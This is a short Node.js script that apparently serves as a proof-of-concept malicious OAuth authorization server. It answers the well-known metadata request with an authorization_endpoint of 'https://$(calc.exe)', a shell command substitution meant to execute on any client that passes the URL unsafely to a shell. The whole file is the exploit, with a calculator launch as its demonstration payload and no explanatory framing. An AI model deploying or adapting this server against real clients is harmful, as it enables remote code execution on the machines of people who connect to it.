const http = require('node:http');
http.createServer((req, res) => {
  if (req.url === '/.well-known/oauth-authorization-server') {
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify({authorization_endpoint: 'https://$(calc.exe)'}));
  } else { res.writeHead(401); res.end(); }
}).listen(8765, '127.0.0.1');
